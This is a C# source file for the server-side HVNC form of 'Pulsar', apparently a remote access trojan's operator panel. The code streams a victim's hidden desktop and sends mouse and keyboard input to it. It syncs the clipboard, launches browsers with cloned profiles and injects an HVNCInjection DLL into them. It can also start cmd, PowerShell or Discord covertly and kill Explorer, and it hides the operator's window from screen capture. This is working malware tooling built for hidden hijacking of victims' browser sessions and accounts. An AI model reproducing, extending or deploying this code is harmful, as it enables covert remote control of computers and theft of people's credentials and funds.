using Gma.System.MouseKeyHook;
using Pulsar.Common.Enums;
using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.Clipboard;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using Pulsar.Server.Utilities;
using Pulsar.Common.Messages.Monitoring.HVNC;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmHVNC : Form
    {
        /// <summary>
        /// States whether remote mouse input is enabled.
        /// </summary>
        private bool _enableMouseInput;

        /// <summary>
        /// States whether remote keyboard input is enabled.
        /// </summary>
        private bool _enableKeyboardInput;

        /// <summary>
        /// Monitors clipboard changes on the server to send to the client
        /// </summary>
        private readonly ClipboardMonitor _clipboardMonitor;

        /// <summary>
        /// States whether bidirectional clipboard sync is enabled
        /// </summary>
        private bool _enableBidirectionalClipboard;

        /// <summary>
        /// The client which can be used for the HVNC.
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly HVNCHandler _hVNCHandler;

        /// <summary>
        /// Stopwatch used to suppress FPS display during the initial seconds of the stream,
        /// preventing unstable or misleading values from being shown.
        /// </summary>
        private readonly Stopwatch _fpsDisplayStopwatch = Stopwatch.StartNew();

        /// <summary>
        /// Last frames per second value to show in the title bar.
        /// </summary>
        private float _lastFps = -1f;

        /// <summary>
        /// Holds the opened HVNC form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmHVNC> OpenedForms = new Dictionary<Client, FrmHVNC>();

        private bool _useGPU = false;
        private const int UpdateInterval = 10;

        // Frame / size metrics
        private readonly Stopwatch _stopwatch = new Stopwatch();
        private int _sizeFrames = 0;
        private int _remoteDesktopWidth = 0;
        private int _remoteDesktopHeight = 0;

        // Auto-hide logic for the "Show" button
        private System.Windows.Forms.Timer _showButtonHideTimer;
        private bool _showButtonVisible = true;
        private bool _mouseHoveringTopArea = false;

        // Fullscreen state
        private bool _isFullscreen = false;
        private Rectangle _previousBounds;
        private FormBorderStyle _previousBorderStyle;
        private FormWindowState _previousWindowState;

        /// <summary>
        /// Creates a new HVNC form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the HVNC form.</param>
        /// <returns>
        /// Returns a new HVNC form for the client if there is none currently open, otherwise creates a new one.
        /// </returns>
        public static FrmHVNC CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmHVNC r = new FrmHVNC(client);
            r.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, r);
            return r;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmHVNC"/> class using the given client.
        /// </summary>
        /// <param name="client">The client used for the HVNC form.</param>
        public FrmHVNC(Client client)
        {
            _connectClient = client;
            _hVNCHandler = new HVNCHandler(client);
            _clipboardMonitor = new ClipboardMonitor(client);

            RegisterMessageHandler();

            try
            {
                InitializeComponent();
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"FrmHVNC.InitializeComponent failed: {ex}");
                MessageBox.Show(
                    $"Failed to initialize HVNC form.\n\n{ex}",
                    "HVNC Error",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
                throw;
            }

            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            // Initial input button visuals
            UpdateInputButtonsVisualState();

            // Layout and resize hookup
            this.Resize += FrmHVNC_Resize;

            // Auto-hide timer for the "Show" button
            _showButtonHideTimer = new System.Windows.Forms.Timer();
            _showButtonHideTimer.Interval = 2500; // 2.5 seconds
            _showButtonHideTimer.Tick += (s, e) =>
            {
                if (!_mouseHoveringTopArea)
                    HideShowButton();
            };

            // Track mouse movement to reveal Show button when hovering near top
            this.MouseMove += Frm_MouseMove;
            picDesktop.MouseMove += Frm_MouseMove;
            panelTop.MouseMove += Frm_MouseMove;

            // Ensure initial layout properly
            UpdateDesktopLayout();
            PositionShowButtonTopCenter();
        }

        private void UpdateInputButtonsVisualState()
        {
            UpdateButtonState(btnMouse, _enableMouseInput);
            UpdateButtonState(btnKeyboard, _enableKeyboardInput);
            UpdateButtonState(btnBiDirectionalClipboard, _enableBidirectionalClipboard);
        }

        private void UpdateButtonState(Button button, bool enabled)
        {
            if (enabled)
            {
                button.BackColor = Color.FromArgb(0, 120, 0); // Dark green
                button.FlatAppearance.BorderColor = Color.LimeGreen;
            }
            else
            {
                button.BackColor = Color.FromArgb(40, 40, 40); // Default dark
                button.FlatAppearance.BorderColor = Color.Gray;
            }
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (connected)
                return;

            if (IsDisposed || !IsHandleCreated)
                return;

            try
            {
                BeginInvoke((MethodInvoker)(() =>
                {
                    if (!IsDisposed)
                        Close();
                }));
            }
            catch (ObjectDisposedException) { }
        }

        /// <summary>
        /// Registers the HVNC message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _hVNCHandler.ProgressChanged += UpdateImage;
            MessageHandler.Register(_hVNCHandler);
        }

        /// <summary>
        /// Unregisters the HVNC message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_hVNCHandler);
            _hVNCHandler.ProgressChanged -= UpdateImage;
            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Subscribes to local mouse and keyboard events for HVNC input.
        /// </summary>
        private void SubscribeEvents()
        {
            picDesktop.MouseDown += PicDesktop_MouseDown;
            picDesktop.MouseUp += PicDesktop_MouseUp;
            picDesktop.MouseMove += PicDesktop_MouseMove;
            picDesktop.MouseWheel += PicDesktop_MouseWheel;
            picDesktop.KeyDown += PicDesktop_KeyDown;
            picDesktop.KeyUp += PicDesktop_KeyUp;

            picDesktop.TabStop = true;
            picDesktop.Focus();
        }

        /// <summary>
        /// Unsubscribes from local mouse and keyboard events.
        /// </summary>
        private void UnsubscribeEvents()
        {
            picDesktop.MouseDown -= PicDesktop_MouseDown;
            picDesktop.MouseUp -= PicDesktop_MouseUp;
            picDesktop.MouseMove -= PicDesktop_MouseMove;
            picDesktop.MouseWheel -= PicDesktop_MouseWheel;
            picDesktop.KeyDown -= PicDesktop_KeyDown;
            picDesktop.KeyUp -= PicDesktop_KeyUp;
        }

        /// <summary>
        /// Starts the HVNC stream and begin to receive desktop frames.
        /// </summary>
        private void StartStream(bool useGPU)
        {
            ToggleConfigurationControls(true);

            picDesktop.Start();
            // Subscribe to the new frame counter.
            picDesktop.SetFrameUpdatedEvent(frameCounter_FrameUpdated);

            this.ActiveControl = picDesktop;

            _hVNCHandler.EnableMouseInput = _enableMouseInput;
            _hVNCHandler.EnableKeyboardInput = _enableKeyboardInput;

            _hVNCHandler.MaxFramesPerSecond = 30;
            _hVNCHandler.BeginReceiveFrames(barQuality.Value, cbMonitors.SelectedIndex, useGPU);
        }

        /// <summary>
        /// Stops the HVNC stream.
        /// </summary>
        private void StopStream()
        {
            ToggleConfigurationControls(false);

            picDesktop.Stop();
            picDesktop.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated);

            this.ActiveControl = picDesktop;

            _hVNCHandler.EndReceiveFrames();
        }

        /// <summary>
        /// Toggles the activatability of configuration controls in the status/configuration panel.
        /// </summary>
        /// <param name="started">When set to <code>true</code> the configuration controls get enabled, otherwise they get disabled.</param>
        private void ToggleConfigurationControls(bool started)
        {
            btnStart.Enabled = !started;
            btnStop.Enabled = started;
            barQuality.Enabled = !started;
            cbMonitors.Enabled = !started;
        }

        /// <summary>
        /// Toggles the visibility of the status/configuration panel.
        /// </summary>
        /// <param name="visible">Decides if the panel should be visible.</param>
        private void TogglePanelVisibility(bool visible)
        {
            panelTop.Visible = visible;
            btnShow.Visible = !visible;
            _showButtonVisible = !visible;

            // Layout refresh
            UpdateDesktopLayout();
            PositionShowButtonTopCenter();

            if (visible)
            {
                // Panel visible -> we don't need the Show button
                _showButtonHideTimer.Stop();
                btnShow.Visible = false;
                _showButtonVisible = false;
            }
            else
            {
                // Panel hidden -> show button briefly, then auto-hide
                btnShow.Visible = true;
                _showButtonVisible = true;
                _showButtonHideTimer.Stop();
                _showButtonHideTimer.Start();
            }

            picDesktop.Invalidate();
        }

        private void PositionShowButtonTopCenter()
        {
            btnShow.Left = (ClientSize.Width - btnShow.Width) / 2;
            btnShow.Top = 10; // distance from top border
        }

        /// <summary>
        /// Called whenever the remote displays changed.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="displays">The currently available displays.</param>
        private void DisplaysChanged(object sender, int displays)
        {
            cbMonitors.Items.Clear();
            for (int i = 0; i < displays; i++)
                cbMonitors.Items.Add($"Display {i + 1}");
            cbMonitors.SelectedIndex = 0;
        }

        /// <summary>
        /// Updates the current desktop image by drawing it to the desktop picturebox.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="bmp">The new desktop image to draw.</param>
        private void UpdateImage(object sender, Bitmap bmp)
        {
            if (!_stopwatch.IsRunning)
                _stopwatch.Start();

            _sizeFrames++;

            double elapsedSeconds = _stopwatch.Elapsed.TotalSeconds;

            if (_hVNCHandler.CurrentFps > 0)
            {
                _lastFps = _hVNCHandler.CurrentFps;
            }

            if (elapsedSeconds >= 1.0)
            {
                _stopwatch.Restart();
            }

            if (_sizeFrames >= 60)
            {
                _sizeFrames = 0;
                long last = _hVNCHandler.LastFrameSizeBytes;
                double avg = _hVNCHandler.AverageFrameSizeBytes;
                if (last > 0 || avg > 0)
                {
                    double avgKB = avg / 1024.0;
                    if (sizeLabelCounter.InvokeRequired)
                    {
                        sizeLabelCounter.BeginInvoke((MethodInvoker)(() =>
                        {
                            sizeLabelCounter.Text = $"{avgKB:0.0}  KB";
                        }));
                    }
                    else
                    {
                        sizeLabelCounter.Text = $"{avgKB:0.0}  KB";
                    }
                }
            }

            picDesktop.UpdateImage(bmp, false);

            // Update remote desktop dimensions for proper mouse coordinate scaling
            _remoteDesktopWidth = picDesktop.ScreenWidth;
            _remoteDesktopHeight = picDesktop.ScreenHeight;
        }

        private void FrmHVNC_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("HVNC", _connectClient);

            OnResize(EventArgs.Empty); // trigger resize event to align controls 

            // Subscribe to displays changed event
            _hVNCHandler.DisplaysChanged += DisplaysChanged;

            // Request monitor count from client
            _hVNCHandler.RefreshDisplays();

            cbMonitors.SelectedIndex = 0;

            // Ensure layout / show button positions are correct initially
            UpdateDesktopLayout();
            PositionShowButtonTopCenter();
        }

        /// <summary>
        /// Updates the title with the current frames per second.
        /// </summary>
        /// <param name="e">The new frames per second.</param>
        private void frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
        {
            float fpsToShow;

            if (_fpsDisplayStopwatch.Elapsed.TotalSeconds < 2)
            {
                // Ignore the first 2 seconds to avoid showing fake FPS values
                fpsToShow = 0f;
            }
            else
            {
                float clientFps = _hVNCHandler.CurrentFps;
                fpsToShow = clientFps > 0f ? clientFps : ((_lastFps > 0f) ? _lastFps : e.CurrentFramesPerSecond);
            }

            this.Text = string.Format("{0} - FPS: {1:0.00}", WindowHelper.GetWindowTitle("HVNC", _connectClient), fpsToShow);
        }

        private void FrmHVNC_FormClosing(object sender, FormClosingEventArgs e)
        {
            // all cleanup logic goes here
            SetClientClipboardSync(false);
            UnsubscribeEvents();
            if (_hVNCHandler.IsStarted) StopStream();
            _hVNCHandler.DisplaysChanged -= DisplaysChanged;
            UnregisterMessageHandler();
            _hVNCHandler.Dispose();
            _clipboardMonitor?.Dispose();

            picDesktop.GetImageSafe?.Dispose();
            picDesktop.GetImageSafe = null;

            if (_showButtonHideTimer != null)
            {
                _showButtonHideTimer.Stop();
                _showButtonHideTimer.Dispose();
                _showButtonHideTimer = null;
            }
        }

        private void FrmHVNC_Resize(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized)
                return;

            UpdateDesktopLayout();
            PositionShowButtonTopCenter();
        }

        /// <summary>
        /// Centralized layout update that ensures picDesktop fills only the visible client area
        /// and the top panel is respected.
        /// </summary>
        private void UpdateDesktopLayout()
        {
            picDesktop.Dock = DockStyle.None;

            int yOffset = 0;
            if (panelTop.Visible)
                yOffset += panelTop.Height;

            picDesktop.Location = new Point(0, yOffset);
            picDesktop.Size = new Size(ClientSize.Width, ClientSize.Height - yOffset);

            picDesktop.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
            picDesktop.Invalidate();
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (cbMonitors.Items.Count == 0)
            {
                MessageBox.Show("No remote display detected.\nPlease wait till the client sends a list with available displays.",
                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            SubscribeEvents();
            StartStream(_useGPU);
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            UnsubscribeEvents();
            StopStream();
        }

        #region HVNC Configuration

        private void barQuality_Scroll(object sender, EventArgs e)
        {
            int value = barQuality.Value;
            lblQualityShow.Text = value.ToString();

            if (value < 25)
                lblQualityShow.Text += " (low)";
            else if (value >= 85)
                lblQualityShow.Text += " (best)";
            else if (value >= 75)
                lblQualityShow.Text += " (high)";
            else if (value >= 25)
                lblQualityShow.Text += " (mid)";

            this.ActiveControl = picDesktop;
        }

        private void btnMouse_Click(object sender, EventArgs e)
        {
            _enableMouseInput = !_enableMouseInput;

            if (_enableMouseInput)
            {
                this.picDesktop.Cursor = Cursors.Hand;
                btnMouse.Image = Properties.Resources.mouse_add;
                btnMouse.BackColor = Color.LightGreen;
                toolTipButtons.SetToolTip(btnMouse, "Disable mouse input.");
            }
            else
            {
                this.picDesktop.Cursor = Cursors.Default;
                btnMouse.Image = Properties.Resources.mouse_delete;
                btnMouse.BackColor = DefaultBackColor;
                toolTipButtons.SetToolTip(btnMouse, "Enable mouse input.");
            }

            _hVNCHandler.EnableMouseInput = _enableMouseInput;
            UpdateInputButtonsVisualState();
            this.ActiveControl = picDesktop;
        }

        private void btnKeyboard_Click(object sender, EventArgs e)
        {
            _enableKeyboardInput = !_enableKeyboardInput;

            if (_enableKeyboardInput)
            {
                this.picDesktop.Cursor = Cursors.Hand;
                btnKeyboard.Image = Properties.Resources.keyboard_add;
                btnKeyboard.BackColor = Color.LightGreen;
                toolTipButtons.SetToolTip(btnKeyboard, "Disable keyboard input.");
            }
            else
            {
                this.picDesktop.Cursor = Cursors.Default;
                btnKeyboard.Image = Properties.Resources.keyboard_delete;
                btnKeyboard.BackColor = DefaultBackColor;
                toolTipButtons.SetToolTip(btnKeyboard, "Enable keyboard input.");
            }

            _hVNCHandler.EnableKeyboardInput = _enableKeyboardInput;
            UpdateInputButtonsVisualState();
            this.ActiveControl = picDesktop;
        }

        private void btnBiDirectionalClipboard_Click(object sender, EventArgs e)
        {
            _enableBidirectionalClipboard = !_enableBidirectionalClipboard;
            UpdateInputButtonsVisualState();

            _clipboardMonitor.IsEnabled = _enableBidirectionalClipboard;
            Debug.WriteLine(_clipboardMonitor.IsEnabled ? "HVNC: Server->Client clipboard sync enabled." : "HVNC: Server->Client clipboard sync disabled.");

            SetClientClipboardSync(_enableBidirectionalClipboard);

            if (_enableBidirectionalClipboard)
            {
                Thread clipboardThread = new Thread(() =>
                {
                    try
                    {
                        Thread.CurrentThread.SetApartmentState(ApartmentState.STA);

                        if (Clipboard.ContainsText())
                        {
                            string clipboardText = Clipboard.GetText();
                            if (!string.IsNullOrEmpty(clipboardText))
                            {
                                Debug.WriteLine($"HVNC: Sending initial clipboard: {clipboardText.Substring(0, Math.Min(20, clipboardText.Length))}...");
                                _connectClient.Send(new SendClipboardData { ClipboardText = clipboardText });
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"HVNC: Error sending initial clipboard: {ex.Message}");
                    }
                });
                clipboardThread.SetApartmentState(ApartmentState.STA);
                clipboardThread.Start();
            }

            this.ActiveControl = picDesktop;
        }

        private void SetClientClipboardSync(bool enabled)
        {
            try
            {
                if (_connectClient != null)
                {
                    _connectClient.ClipboardSyncEnabled = enabled;
                }

                _connectClient?.Send(new SetClipboardMonitoringEnabled { Enabled = enabled });
                Debug.WriteLine(enabled
                    ? "HVNC: Requested client clipboard sync enable."
                    : "HVNC: Requested client clipboard sync disable.");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"HVNC: Failed to update client clipboard sync state: {ex.Message}");
            }
        }

        #endregion

        #region Helper Methods

        /// <summary>
        /// Loads the HVNCInjection.x64.dll from the current working directory as bytes.
        /// </summary>
        /// <returns>The DLL bytes, or null if the file is not found.</returns>
        private byte[] GetHVNCInjectionDllBytes()
        {
            try
            {
                string dllPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "HVNCInjection.x64.dll");
                if (File.Exists(dllPath))
                {
                    return File.ReadAllBytes(dllPath);
                }
                else
                {
                    Debug.WriteLine($"HVNCInjection.x64.dll not found at: {dllPath}");
                    return null;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error loading HVNCInjection.x64.dll: {ex.Message}");
                return null;
            }
        }

        #endregion

        #region MenuItems

        private void menuItem1_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Explorer"
            });
        }

        private void menuItem2_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Chrome",
                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
                DllBytes = GetHVNCInjectionDllBytes()
            });
        }

        private void startEdgeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Edge",
                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
                DllBytes = GetHVNCInjectionDllBytes()
            });
        }

        private void startBraveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Brave",
                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
                DllBytes = GetHVNCInjectionDllBytes()
            });
        }

        private void startOperaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Opera",
                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
                DllBytes = GetHVNCInjectionDllBytes()
            });
        }

        private void startOperaGXToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "OperaGX",
                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
                DllBytes = GetHVNCInjectionDllBytes()
            });
        }

        private void startFirefoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Mozilla",
                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked
            });
        }

        private void startCmdToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Cmd"
            });
        }

        private void startPowershellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Powershell"
            });
        }

        private void startCustomPathToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FrmCustomFileStarter fileSelectionForm = new FrmCustomFileStarter(_connectClient, typeof(StartHVNCProcess));
            fileSelectionForm.ShowDialog();
        }

        private void startGenericChromiumToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FrmHVNCPopUp genericBrowserForm = new FrmHVNCPopUp(_connectClient, GetHVNCInjectionDllBytes());
            genericBrowserForm.ShowDialog();
        }

        private void cLONEBROWSERPROFILEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            cLONEBROWSERPROFILEToolStripMenuItem.Checked = !cLONEBROWSERPROFILEToolStripMenuItem.Checked;

            if (cLONEBROWSERPROFILEToolStripMenuItem.Checked)
            {
                cLONEBROWSERPROFILEToolStripMenuItem.Text = "CLONE BROWSER PROFILE";
            }
            else
            {
                cLONEBROWSERPROFILEToolStripMenuItem.Text = "DIRECT START BROWSER";
            }
        }

        private void startDiscordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Discord"
            });
        }

        #endregion

        #region Input Event Handlers

        /// <summary>
        /// Scales the X coordinate from the control space to the remote desktop space.
        /// Uses floating-point math for more accurate scaling, then rounds to nearest integer.
        /// </summary>
        private int ScaleX(int x)
        {
            if (_remoteDesktopWidth == 0 || picDesktop.Width == 0)
                return x;

            return (int)Math.Round((double)x * _remoteDesktopWidth / picDesktop.Width);
        }

        /// <summary>
        /// Scales the Y coordinate from the control space to the remote desktop space.
        /// Uses floating-point math for more accurate scaling, then rounds to nearest integer.
        /// </summary>
        private int ScaleY(int y)
        {
            if (_remoteDesktopHeight == 0 || picDesktop.Height == 0)
                return y;

            return (int)Math.Round((double)y * _remoteDesktopHeight / picDesktop.Height);
        }

        private void PicDesktop_MouseDown(object sender, MouseEventArgs e)
        {
            if (!_enableMouseInput) return;

            uint message = e.Button switch
            {
                MouseButtons.Left => 0x0201,
                MouseButtons.Right => 0x0204,
                MouseButtons.Middle => 0x0207,
                _ => 0
            };
            if (message == 0) return;

            int wParam = 0;
            int lParam = (ScaleY(e.Y) << 16) | (ScaleX(e.X) & 0xFFFF);
            _hVNCHandler.SendMouseEvent(message, wParam, lParam);
        }

        private void PicDesktop_MouseUp(object sender, MouseEventArgs e)
        {
            if (!_enableMouseInput) return;

            uint message = e.Button switch
            {
                MouseButtons.Left => 0x0202,
                MouseButtons.Right => 0x0205,
                MouseButtons.Middle => 0x0208,
                _ => 0
            };
            if (message == 0) return;

            int wParam = 0;
            int lParam = (ScaleY(e.Y) << 16) | (ScaleX(e.X) & 0xFFFF);
            _hVNCHandler.SendMouseEvent(message, wParam, lParam);
        }

        private void PicDesktop_MouseMove(object sender, MouseEventArgs e)
        {
            if (!_enableMouseInput) return;

            uint message = 0x0200;
            int wParam = 0;
            int lParam = (ScaleY(e.Y) << 16) | (ScaleX(e.X) & 0xFFFF);
            _hVNCHandler.SendMouseEvent(message, wParam, lParam);
        }

        private void PicDesktop_MouseWheel(object sender, MouseEventArgs e)
        {
            if (!_enableMouseInput) return;

            int x = ScaleX(e.X);
            int y = ScaleY(e.Y);

            if (e.Delta != 0)
            {
                int buttonMask = e.Delta > 0 ? 0x0010 : 0x0020; // Wheel up/down
                _hVNCHandler.SendMouseEvent(0x0201, buttonMask, (y << 16) | (x & 0xFFFF));
                _hVNCHandler.SendMouseEvent(0x0202, 0, (y << 16) | (x & 0xFFFF));
            }
        }

        private void PicDesktop_KeyDown(object sender, KeyEventArgs e)
        {
            if (!_enableKeyboardInput) return;

            uint message = 0x0100; // WM_KEYDOWN
            int wParam = (int)e.KeyCode;
            int lParam = BuildKeyboardLParam(e.KeyCode, false); // false = key down

            _hVNCHandler.SendKeyboardEvent(message, wParam, lParam);
        }

        private void PicDesktop_KeyUp(object sender, KeyEventArgs e)
        {
            if (!_enableKeyboardInput) return;

            uint message = 0x0101; // WM_KEYUP
            int wParam = (int)e.KeyCode;
            int lParam = BuildKeyboardLParam(e.KeyCode, true); // true = key up

            _hVNCHandler.SendKeyboardEvent(message, wParam, lParam);
        }

        #endregion

        private void btnHide_Click(object sender, EventArgs e)
        {
            TogglePanelVisibility(false);

            // kick off hide timer after user hides panel
            _showButtonHideTimer.Stop();
            _showButtonHideTimer.Start();
        }

        private void btnShow_Click(object sender, EventArgs e)
        {
            TogglePanelVisibility(true);
        }

        #region Win32 API and Helper Methods

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        /// <summary>
        /// Builds the appropriate lParam value for keyboard messages.
        /// </summary>
        /// <param name="keyCode">The Windows Forms key code</param>
        /// <param name="isKeyUp">True if this is a key up event, false for key down</param>
        /// <returns>The properly formatted lParam for the keyboard message</returns>
        private int BuildKeyboardLParam(Keys keyCode, bool isKeyUp)
        {
            int vk = (int)keyCode;
            uint scanCode = MapVirtualKey((uint)vk, 0); // MAPVK_VK_TO_VSC = 0

            int lParam = 0;

            lParam |= 1; // repeat count

            lParam |= (int)(scanCode << 16);

            if (IsExtendedKey(vk))
            {
                lParam |= (1 << 24);
            }

            if (isKeyUp)
            {
                lParam |= (1 << 30);
                lParam |= (1 << 31);
            }

            return lParam;
        }

        /// <summary>
        /// Determines if a virtual key code represents an extended key.
        /// </summary>
        /// <param name="virtualKey">The virtual key code</param>
        /// <returns>True if the key is an extended key</returns>
        private bool IsExtendedKey(int virtualKey)
        {
            switch (virtualKey)
            {
                case (int)Keys.Prior:      // Page Up
                case (int)Keys.Next:       // Page Down
                case (int)Keys.End:        // End
                case (int)Keys.Home:       // Home
                case (int)Keys.Left:       // Left arrow
                case (int)Keys.Up:         // Up arrow
                case (int)Keys.Right:      // Right arrow
                case (int)Keys.Down:       // Down arrow
                case (int)Keys.Insert:     // Insert
                case (int)Keys.Delete:     // Delete
                case (int)Keys.LWin:       // Left Windows
                case (int)Keys.RWin:       // Right Windows
                case (int)Keys.Apps:       // Menu
                case (int)Keys.LShiftKey:  // Left Shift (when differentiated)
                case (int)Keys.RShiftKey:  // Right Shift
                case (int)Keys.LControlKey: // Left Control
                case (int)Keys.RControlKey: // Right Control
                case (int)Keys.LMenu:      // Left Alt
                case (int)Keys.RMenu:      // Right Alt
                case (int)Keys.Scroll:     // Scroll Lock
                    return true;
                default:
                    return false;
            }
        }

        #endregion

        // ======== FULLSCREEN TOGGLE ========

        private void ToggleFullscreen()
        {
            if (!_isFullscreen)
            {
                // save normal mode layout
                _previousBounds = this.Bounds;
                _previousBorderStyle = this.FormBorderStyle;
                _previousWindowState = this.WindowState;

                // go borderless fullscreen on current monitor
                FormBorderStyle = FormBorderStyle.None;
                WindowState = FormWindowState.Normal;
                Bounds = Screen.FromControl(this).Bounds;

                // hide top panel
                panelTop.Visible = false;

                // picDesktop fills entire area
                UpdateDesktopLayout();

                // show the show-button (auto-hide timer will handle hiding)
                btnShow.Visible = true;
                _showButtonVisible = true;
                PositionShowButtonTopCenter();
                _showButtonHideTimer.Stop();
                _showButtonHideTimer.Start();

                _isFullscreen = true;
            }
            else
            {
                // restore previous window settings
                FormBorderStyle = _previousBorderStyle;
                WindowState = _previousWindowState;
                Bounds = _previousBounds;

                // restore panel visibility
                panelTop.Visible = true;

                // restore layout
                UpdateDesktopLayout();

                // hide show button again
                btnShow.Visible = false;
                _showButtonVisible = false;
                _showButtonHideTimer.Stop();

                _isFullscreen = false;
            }
        }

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            // ESC exits fullscreen
            if (keyData == Keys.Escape && _isFullscreen)
            {
                ToggleFullscreen();
                return true; // handled
            }

            // F11 toggles fullscreen
            if (keyData == Keys.F11)
            {
                ToggleFullscreen();
                return true; // handled
            }

            return base.ProcessCmdKey(ref msg, keyData);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            ToggleFullscreen();
        }

        // ======== SHOW BUTTON AUTO-HIDE / HOVER LOGIC ========

        private void Frm_MouseMove(object sender, MouseEventArgs e)
        {
            // Convert to form client coordinates
            Point clientPos = e.Location;
            if (sender is Control c && c != this)
            {
                clientPos = this.PointToClient(c.PointToScreen(e.Location));
            }

            int hoverZoneHeight = 40; // top 40px area
            bool isHoveringTop = clientPos.Y <= hoverZoneHeight;

            if (isHoveringTop && !panelTop.Visible)
            {
                _mouseHoveringTopArea = true;
                ShowShowButton();
            }
            else
            {
                _mouseHoveringTopArea = false;

                if (_showButtonVisible)
                {
                    _showButtonHideTimer.Stop();
                    _showButtonHideTimer.Start();
                }
            }
        }

        private void HideShowButton()
        {
            if (!_showButtonVisible)
                return;

            _showButtonVisible = false;
            btnShow.Visible = false;
        }

        private void ShowShowButton()
        {
            if (_showButtonVisible)
                return;

            _showButtonVisible = true;
            btnShow.Visible = true;

            // Restart timer so it hides again after a delay
            _showButtonHideTimer.Stop();
            _showButtonHideTimer.Start();
        }

        private void closeExplorerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "KillExplorer"
            });
        }

    }
}
